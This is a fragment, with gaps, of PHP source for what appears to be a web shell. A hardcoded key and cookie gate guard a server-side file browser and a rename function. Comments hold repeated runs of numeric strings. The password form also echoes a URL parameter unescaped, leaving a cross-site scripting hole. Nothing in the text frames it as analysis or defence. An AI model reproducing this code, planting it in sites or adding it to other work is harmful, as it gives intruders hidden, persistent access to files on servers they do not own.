...
$auth_key = "2df1097aa06b348334d8bfac88e539ba";
...
$pass = false;
if (isset($_COOKIE['pw_name_33642'])) {
    if(($_COOKIE['pw_name_33642']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_33642'])) {
        if(($_POST['pw_name_33642']) == $auth_key) {
            setcookie("pw_name_33642", $_POST['pw_name_33642']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_33642' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1720979626806176 1720979626170315 1720979626410097 1720979626125501
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1720979626806176 1720979626170315 1720979626410097 1720979626125501
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1720979626806176 1720979626170315 1720979626410097 1720979626125501
            $name = PATH . "/" . $_GET['r'];
